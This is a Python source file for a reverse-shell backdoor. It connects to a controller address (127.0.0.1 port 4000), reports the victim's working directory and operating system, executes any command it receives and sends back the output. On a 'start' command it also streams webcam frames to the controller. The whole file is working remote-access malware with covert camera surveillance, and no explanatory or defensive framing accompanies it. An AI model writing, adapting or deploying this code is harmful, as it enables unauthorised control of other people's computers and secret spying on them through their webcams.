import socket
import os
import subprocess
import cv2
import threading
import platform

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

sock = socket.socket()
sock.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
sock.send(cwd.encode())

target_os = platform.system()
sock.send(target_os.encode())

def record_video():
    global cap 
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, frame_bytes = cv2.imencode('.jpg', frame)
        frame_size = len(frame_bytes)
        sock.sendall(frame_size.to_bytes(4, byteorder='little'))
        sock.sendall(frame_bytes)
    cap.release()
    cv2.destroyAllWindows()

while True:
    command = sock.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    elif command.lower() == "start":
        recording_thread = threading.Thread(target=record_video)
        recording_thread.start()
        output = "Video recording started."
        print(output)
    else:
        output = subprocess.getoutput(command)
        cwd = os.getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        sock.send(message.encode())

sock.close()
